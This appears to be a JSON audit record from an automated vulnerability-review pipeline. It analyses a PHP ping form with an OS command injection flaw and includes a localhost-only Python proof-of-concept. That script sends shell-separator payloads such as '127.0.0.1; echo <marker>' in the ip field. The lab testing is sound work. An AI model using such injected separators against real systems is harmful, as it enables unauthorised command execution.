@@ -1,0 +1,160 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "CMD-001",
+  "input_version": "v2",
+  "prompt_version": "final-wp4-v1",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "CMD-001"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "静态链路完整：行2以isset($_POST['Submit'])进入处理，行4用$_REQUEST['ip']取得完全可控的$target且无任何校验或转义，行6按php_uname选择系统分支，行8或行12把$target原样拼接到shell_exec的命令字符串，行15把命令输出放入<pre>。片段内不存在escapeshellarg/escapeshellcmd、白名单、数值校验或固定参数约束，因此命令注入的输入、危险操作与防护缺口三要素均有逐字代码证据；部署操作系统、shell_exec启用状态与ping可用性属运行前置条件，不影响静态候选判断，但不升级为确认。"
+  },
+  "findings": [
+    {
+      "finding_id": "CMD-001-F1",
+      "vulnerability_type": "命令注入",
+      "locations": [
+        {
+          "fragment_id": "CMD-001",
+          "line_start": 2,
+          "line_end": 2,
+          "quote": "if( isset( $_POST[ 'Submit' ]  ) ) {"
+        },
+        {
+          "fragment_id": "CMD-001",
+          "line_start": 4,
+          "line_end": 4,
+          "quote": "$target = $_REQUEST[ 'ip' ];"
+        },
+        {
+          "fragment_id": "CMD-001",
+          "line_start": 6,
+          "line_end": 6,
+          "quote": "if( stristr( php_uname( 's' ), 'Windows NT' ) ) {"
+        },
+        {
+          "fragment_id": "CMD-001",
+          "line_start": 8,
+          "line_end": 8,
+          "quote": "$cmd = shell_exec( 'ping  ' . $target );"
+        },
+        {
+          "fragment_id": "CMD-001",
+          "line_start": 12,
+          "line_end": 12,
+          "quote": "$cmd = shell_exec( 'ping  -c 4 ' . $target );"
+        },
+        {
+          "fragment_id": "CMD-001",
+          "line_start": 15,
+          "line_end": 15,
+          "quote": "$html .= \"<pre>{$cmd}</pre>\";"
+        }
+      ],
+      "data_flow": [
+        "样本说明：外围处理器启动登录会话、按配置包含本片段，再把$html插入page['body']并由dvwaHtmlEcho输出；触发入口为POST Submit（行2）。",
+        "行4：$target = $_REQUEST['ip']，请求值直接成为命令参数字符串；片段内没有trim、格式校验、白名单或类型转换。",
+        "行6：按php_uname('s')是否含'Windows NT'选择分支，决定后续使用'ping  '（行8）还是'ping  -c 4 '（行12）前缀。",
+        "行8/行12：$target被原样拼接到shell_exec的单一命令字符串末尾，参数边界无引号、无escapeshellarg，shell会把元字符解释为命令分隔。",
+        "行15：$cmd（命令标准输出与标准错误）写入$html的<pre>区域，作为区分'命令输出区'与'页面反射'的观察点。",
+        "注入语义：POSIX分支可在ip中放';'、'|'、'&&'、反引号或'$()'开始新命令；Windows分支可用'&'、'|'、'&&'；两种语法不能互换。"
+      ],
+      "principle": "shell_exec接受单个字符串并交给系统shell执行（POSIX通常为/bin/sh -c，Windows为cmd /c）。不可信输入与固定前缀在同一命令字符串内拼接时，未转义的shell元字符会终止ping并开始执行后续命令，例如POSIX的'127.0.0.1; echo X'、cmd.exe的'127.0.0.1 & echo X'。片段内没有escapeshellarg、escapeshellcmd、白名单或数值判断，行15只是把输出放进<pre>，不改变命令解释语义，因此属于典型的操作系统命令注入。",
+      "impact": "以Web服务进程身份执行任意系统命令（受部署用户权限限制），可导致主机与内网信息泄露、主机/端口探测（ping本身便于存活探测）、读取Web进程可访问的数据，并为进一步横向移动提供条件。教学验证只回显无害标记，不执行其他操作。",
+      "preconditions": [
+        "部署实例中shell_exec未被disable_functions禁用（片段内没有其他执行路径）。",
+        "目标系统存在可用的ping可执行文件；精简容器可能缺失，此时基线输出为空或报错。",
+        "请求能到达包含本片段的处理器，且满足外围处理器的登录会话/认证要求。",
+        "按部署的难度配置，本片段被实际包含（片段自身没有过滤，难度选择在外围处理器）。",
+        "攻击者可控制ip参数：行4用$_REQUEST读取，表单字段名ip来自POST，$_REQUEST还会接收GET与COOKIE来源。",
+        "按部署操作系统选择对应载荷：POSIX用';'等，Windows用'&'；同一载荷不能同时覆盖两分支。"
+      ],
+      "counterexamples": [
+        "若部署在disable_functions中禁用shell_exec，调用失败，<pre>为空或出现PHP警告；这是环境状态，不能反过来当作过滤生效的证明。",
+        "若外围处理器在包含本片段前对ip做白名单或escapeshellarg处理（该文件未提供，无法确认），目标路径可能被阻挡；本片段内看不到这类处理。",
+        "若目标主机没有ping，命令返回错误文本；缺少ping只影响基线观察，不会自动阻止注入的后续命令，仍需用echo标记判断。",
+        "若输入只用于固定命令且不参与拼接（本片段不属此情形），或ip被服务端替换为常量，则不构成注入。",
+        "若处理器要求token且token无效，请求被拒属前置条件失败，不能读成输入过滤。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "Python",
+        "code": "#!/usr/bin/env python3\n\"\"\"CMD-001 command-injection confirmation draft.\n\nLocal authorized lab only. Sends the audited parameters (Submit, ip) to the\ndeployed handler that includes the audited fragment and separates:\n  * the <pre> command-output region parsed from the HTML response,\n  * a reflection-only control payload (marker without shell metacharacters),\n  * the marker echo produced only if the shell interprets the separator.\nStandard library only (Python 3.8+).\n\"\"\"\n\nimport argparse\nimport http.cookiejar\nimport json\nimport re\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nMARKER = \"CMD001_MARKER_7f3a\"\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    \"\"\"Refuse redirects so an off-scope target is never followed.\"\"\"\n\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        raise urllib.error.HTTPError(\n            req.full_url, code, \"redirect refused: \" + str(newurl), headers, fp\n        )\n\n\ndef make_opener():\n    jar = http.cookiejar.CookieJar()\n    return urllib.request.build_opener(\n        urllib.request.HTTPCookieProcessor(jar), NoRedirect()\n    )\n\n\ndef assert_local(url):\n    parts = urllib.parse.urlsplit(url)\n    if parts.scheme not in (\"http\", \"https\"):\n        raise SystemExit(\"unsupported URL scheme: %r\" % (parts.scheme,))\n    if (parts.hostname or \"\") not in ALLOWED_HOSTS:\n        raise SystemExit(\"host not in local allowlist: %r\" % (parts.hostname,))\n\n\ndef http_get(opener, url, cookie, timeout):\n    req = urllib.request.Request(url, method=\"GET\")\n    if cookie:\n        req.add_header(\"Cookie\", cookie)\n    with opener.open(req, timeout=timeout) as resp:\n        return resp.getcode(), resp.read().decode(\"utf-8\", \"replace\")\n\n\ndef http_post(opener, url, cookie, fields, timeout):\n    body = urllib.parse.urlencode(fields).encode(\"utf-8\")\n    req = urllib.request.Request(url, data=body, method=\"POST\")\n    req.add_header(\"Content-Type\", \"application/x-www-form-urlencoded\")\n    if cookie:\n        req.add_header(\"Cookie\", cookie)\n    with opener.open(req, timeout=timeout) as resp:\n        return resp.getcode(), resp.read().decode(\"utf-8\", \"replace\")\n\n\ndef fresh_token(opener, url, cookie, regex, timeout):\n    _, html = http_get(opener, url, cookie, timeout)\n    if not regex:\n        return None\n    match = re.search(regex, html, re.S)\n    if not match:\n        return None\n    return match.group(1) if match.groups() else match.group(0)\n\n\ndef plain(text):\n    text = re.sub(r\"<br\\s*/?>\", \"\\n\", text, flags=re.I)\n    return re.sub(r\"<[^>]*>\", \"\", text)\n\n\ndef parse_result(html):\n    blocks = [plain(b) for b in re.findall(r\"<pre>(.*?)</pre>\", html, re.S | re.I)]\n    outside = re.sub(r\"<pre>.*?</pre>\", \" \", html, flags=re.S | re.I)\n    return {\n        \"pre_command_output\": \" | \".join(\" \".join(b.split()) for b in blocks),\n        \"marker_standalone_line_in_pre\": any(\n            line.strip() == MARKER for block in blocks for line in block.splitlines()\n        ),\n        \"marker_anywhere_in_pre\": any(MARKER in block for block in blocks),\n        \"marker_outside_pre_reflection\": MARKER in outside,\n        \"pre_region_found\": bool(blocks),\n    }\n\n\ndef main():\n    parser = argparse.ArgumentParser(\n        description=\"CMD-001 validation draft, local authorized lab only\"\n    )\n    parser.add_argument(\n        \"--url\",\n        required=True,\n        help=\"full URL of the deployed handler route that includes the audited \"\n        \"fragment (the fragment itself names no path; supply it from the local deployment)\",\n    )\n    parser.add_argument(\n        \"--cookie\",\n        default=\"\",\n        help=\"raw Cookie header value read from a local file; never commit or print it\",\n    )\n    parser.add_argument(\"--submit-field\", default=\"Submit\")\n    parser.add_argument(\"--submit-value\", default=\"Submit\")\n    parser.add_argument(\"--ip-field\", default=\"ip\")\n    parser.add_argument(\n        \"--token-field\",\n        default=None,\n        help=\"set only if the deployed handler enforces a CSRF token on this form\",\n    )\n    parser.add_argument(\"--token-regex\", default=None)\n    parser.add_argument(\"--timeout\", type=float, default=10.0)\n    parser.add_argument(\n        \"--include-windows\",\n        action=\"store_true\",\n        help=\"also send the cmd.exe '&' variant\",\n    )\n    args = parser.parse_args()\n\n    assert_local(args.url)\n    opener = make_opener()\n    cases = [\n        (\"baseline\", \"127.0.0.1\", \"normal parameter only\"),\n        (\"control_no_metachar\", \"127.0.0.1 \" + MARKER, \"marker without shell metacharacter\"),\n        (\"test_posix\", \"127.0.0.1; echo \" + MARKER, \"POSIX shell separator ';'\"),\n    ]\n    if args.include_windows:\n        cases.append(\n            (\"test_cmd\", \"127.0.0.1 & echo \" + MARKER, \"cmd.exe separator '&'\")\n        )\n\n    token_failures = 0\n    for name, ip_value, note in cases:\n        fields = {\n            args.submit_field: args.submit_value,\n            args.ip_field: ip_value,\n        }\n        if args.token_field:\n            token = fresh_token(\n                opener, args.url, args.cookie, args.token_regex, args.timeout\n            )\n            if not token:\n                token_failures += 1\n                print(\n                    json.dumps(\n                        {\n                            \"case\": name,\n                            \"precondition_failed\": \"fresh token not found; not a filtering result\",\n                        },\n                        ensure_ascii=False,\n                    )\n                )\n                continue\n            fields[args.token_field] = token\n        try:\n            status, html = http_post(\n                opener, args.url, args.cookie, fields, args.timeout\n            )\n        except urllib.error.HTTPError as exc:\n            print(\n                json.dumps(\n                    {\"case\": name, \"http_error\": exc.code, \"payload\": ip_value},\n                    ensure_ascii=False,\n                )\n            )\n            continue\n        except urllib.error.URLError as exc:\n            print(\n                json.dumps(\n                    {\"case\": name, \"url_error\": str(exc.reason), \"payload\": ip_value},\n                    ensure_ascii=False,\n                )\n            )\n            continue\n        result = parse_result(html)\n        result.update(\n            {\n                \"case\": name,\n                \"payload\": ip_value,\n                \"http_status\": status,\n                \"note\": note,\n            }\n        )\n        print(json.dumps(result, ensure_ascii=False, indent=2))\n\n    if token_failures:\n        return 2\n    return 0\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+（仅标准库：argparse、http.cookiejar、json、re、sys、urllib）",
+          "本地已部署且包含本片段的处理器路由URL（片段未给出路径，需从部署配置提供）",
+          "可选的会话Cookie（由测试人员放在本地文件中读取，不写入版本库、不打印）",
+          "目标主机需存在ping；PHP需未在disable_functions中禁用shell_exec"
+        ],
+        "parameters": [
+          "--url（必填）：包含本片段的处理器完整URL，例如 http://127.0.0.1:<port>/<部署路由>；路径不来自片段代码，必须由本地部署提供",
+          "--cookie：本地文件提供的Cookie原文，可为空；不提交到版本库",
+          "--submit-field 默认 Submit，--submit-value 默认 Submit：字段名来自行2的$_POST['Submit']，具体提交值需按部署表单核对",
+          "--ip-field 默认 ip：来自行4的$_REQUEST['ip']",
+          "--token-field/--token-regex：仅当部署处理器额外要求CSRF token时使用；脚本每个请求都用同一会话重新GET并提取最新token",
+          "--include-windows：追加cmd.exe的'&'分隔变体；Linux/POSIX环境应使用默认的';'变体",
+          "--timeout 默认10秒：单请求超时"
+        ],
+        "steps": [
+          "1. 在本地授权靶场部署包含本片段的处理器，确认php.ini未禁用shell_exec、系统存在ping，并记录PHP版本、操作系统与难度配置。",
+          "2. 用测试账号登录并导出会话Cookie到本地文件（若处理器不强制登录则留空）；不要使用生产口令。",
+          "3. 运行基线：python3 cmd001_poc.py --url <本地处理器URL> --cookie \"<来自本地文件>\"；确认<pre>区域出现ping正常输出，证明路由与观察区解析正确。",
+          "4. 运行对照：脚本的control_no_metachar载荷为'127.0.0.1 CMD001_MARKER_7f3a'（空格，无shell元字符），确认标记不会以独立一行出现在<pre>区域。",
+          "5. 运行测试：POSIX系统执行默认的test_posix载荷'127.0.0.1; echo CMD001_MARKER_7f3a'；Windows系统加--include-windows得到'127.0.0.1 & echo CMD001_MARKER_7f3a'。",
+          "6. 解析响应：只把HTML中<pre>...</pre>的内容当作命令输出区，按行判断是否存在恰好等于CMD001_MARKER_7f3a的独立行；同时记录<pre>之外的反射。",
+          "7. 若存在token字段，观察每次GET取得的新token是否被接受；token缺失或拒绝记为前置条件失败，不记为过滤生效。",
+          "8. 重复一次相同请求确认结果稳定，并保存完整响应HTML、请求参数、系统分支与时间，供工作包4对照核验。",
+          "9. 清理：本草案只执行ping与echo标记，不写文件、不改配置；无需数据恢复，仅删除本地临时Cookie副本与响应记录中不应保留的会话信息。"
+        ],
+        "expected_observation": "基线请求的<pre>命令输出区应出现ping的正常输出（如PING、bytes from、ping statistics，具体文案随操作系统与locale变化）。control_no_metachar（'127.0.0.1 CMD001_MARKER_7f3a'）中标记至多出现在ping把整串当作主机名/参数时的错误文案里，不应单独成行。<pre>区域内的marker_standalone_line_in_pre=false且marker_outside_pre_reflection=false，说明没有额外的shell解释通道。test_posix（或Windows上的test_cmd）若被shell解释，则<pre>区域会在ping输出之后新增一行恰好等于CMD001_MARKER_7f3a的内容；若标记只出现在'unknown host ...'、'Name or service not known'或ping的用法提示里，则只是ping回显了自己的参数，不是命令执行。标记出现在<pre>之外属于页面反射，不能当作命令执行证据。",
+        "success_criteria": "1) 观察区: 只用HTML中<pre>...</pre>区域的文本判定，解析脚本的parse_result字段；HTTP状态码、响应长度或哈希不参与结论。2) 基线有效: 基线响应<pre>中存在ping的正常统计输出（PING/bytes from/ping statistics等），证明处理器确实执行了ping、观察区解析正确；若<pre>为空或只有PHP警告，先排查shell_exec禁用、ping缺失、路由或认证错误，不能判为过滤生效。3) 对照有效: control_no_metachar响应中marker_standalone_line_in_pre=false且marker_outside_pre_reflection=false；若对照也出现独立行标记，说明存在其他输出通道或载荷被ping拆分成参数，必须先排除再重测。4) 触发成立: test_posix（或Windows上的test_cmd）响应的<pre>中marker_standalone_line_in_pre=true，且该独立行位于ping输出之后；仅marker_anywhere_in_pre=true而standalone=false不算确认。5) 对照差异: 相同标记只在带shell分隔符的载荷中成为独立行，而在无分隔符对照中不成立，二者差异与行4→行8/行12→行15的代码路径一致。6) 可重复: 同一会话重复请求得到相同结果；token缺失/被拒、连接错误、重定向分别记为前置条件失败或脚本失败，不计为漏洞失败或过滤生效。7) 记录: 保存原始响应HTML、实际载荷、操作系统分支、Cookie来源与时间，供工作包4保存并复核。",
+        "limitations": [
+          "片段没有给出HTTP路径，--url必须由本地部署提供，脚本无法自行推导路由。",
+          "部署操作系统未知：POSIX与cmd.exe载荷必须分别测试，不能用一种语法推断另一种。",
+          "Shell_exec启用状态、disable_functions、PHP版本与ping可用性均未实测；若被禁用，空输出不能证明过滤有效。",
+          "处理器是否要求登录、是否额外校验或转义ip，取决于未提供的外围处理器代码；本脚本只覆盖片段所示行为。",
+          "重定向被主动拒绝；若靶场把POST重定向到登录页，需要先修正会话/路径，而不是放宽跳转。",
+          "未运行脚本，执行状态为未运行；仅做静态审查，未验证Python语法或实际HTTP交互。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "部署操作系统与php_uname('s')的实际返回值，决定进入行8的Windows分支还是行12的*nix分支",
+    "PHP版本与disable_functions配置，即shell_exec是否实际可用",
+    "目标主机是否安装ping以及是否在PATH中，缺少时基线观察为空",
+    "包含本片段的外围处理器路由（URL路径）、提交按钮名与$_REQUEST的variables_order顺序；片段未给出路径",
+    "登录会话/认证是否为必需条件，以及难度配置的实际取值（该配置决定本片段是否被包含）",
+    "外围处理器或dvwaPage.inc.php是否在包含片段前后对ip追加校验或输出编码（未提供该文件，无法核对）",
+    "处理器是否附加CSRF token（片段内没有token处理代码）"
+  ],
+  "risk_notes": [
+    "行4使用$_REQUEST而非$_POST，同一ip值还可经GET查询串或Cookie进入（取决于variables_order），属于同一片段外延的输入面风险。",
+    "ping可用于内网主机发现与存活/拓扑探测，属于本次关注类型之外的信息收集风险。",
+    "行15把shell输出未经htmlspecialchars直接拼进HTML，若命令输出含HTML标记可能形成内容注入，与命令注入分开记录。",
+    "shell_exec输出包含stderr，错误文本可能泄露路径、用户名等主机信息。"
+  ],
+  "quality_notes": [
+    "行4用$_REQUEST读取参数，来源宽于表单声明的POST，掩盖参数来源。",
+    "行6每次请求调用php_uname判断操作系统，分支依赖运行环境而非显式部署配置。",
+    "行8与行12以字符串拼接构造命令，缺少escapeshellarg/escapeshellcmd或白名单。",
+    "行15输出未转义，命令输出与HTML混排。"
+  ],
+  "limitations": [
+    "本次仅收到并读取最终包 CMD-001.md（序号1/1，期望顺序一致），未读取工作包1、工作包3、其他样本、标签或README；因此没有跨包片段可归并，行号为该规范化片段从1起始的局部行号。",
+    "未运行任何请求，runtime_evidence 为空；verdict 保持待验证，POC 为草案。",
+    "POC 的URL路径参数不来自片段代码，必须由本地部署补充；片段内没有可直接套用的路由。",
+    "POC 脚本未做语法编译或实际请求验证，status 为需人工适配，execution_status 为未运行。",
+    "Windows 与 Linux 两条命令分支需在对应操作系统分别测试，载荷语法不能互换。",
+    "片段内无 maxlength、隐藏按钮或客户端限制之类的线索；POC 标记仅17个字符，不受表单长度影响，若部署另有限制需在人工适配时记录。",
+    "静态判断基于片段与样本说明，不推断外围处理器、框架或服务器配置的默认行为。"
+  ],
+  "runtime_evidence": []
+}
